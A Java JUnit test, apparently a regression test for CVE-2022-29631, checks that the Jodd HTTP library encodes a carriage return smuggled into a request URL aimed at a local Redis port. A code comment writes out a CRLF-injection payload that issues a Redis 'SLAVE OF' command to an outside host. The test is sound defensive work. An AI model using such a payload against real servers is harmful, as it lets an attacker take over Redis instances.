package com.magneto;

import jodd.http.HttpRequest;
import org.junit.Test;
import static org.junit.Assert.assertEquals;

public class CVE_2022_29631_Testcase1 {

    @Test
    public void testGet_crlf_injection() {
        String url = "http://127.0.0.1:6379/ \rfoo";
        // "HTTP/1.1\r\nHost: 127.0.0.13:1099\r\n\r\nSLAVE OF
        // inhann.top:6379\r\n\r\nPOST / ";
        HttpRequest req = HttpRequest.get(url);
        validateReturnValue(req);
    }

    public void validateReturnValue(HttpRequest req) {
        assertEquals("GET /%20%0Dfoo HTTP/1.1", req.toString().split("\n")[0].trim());
    }
}
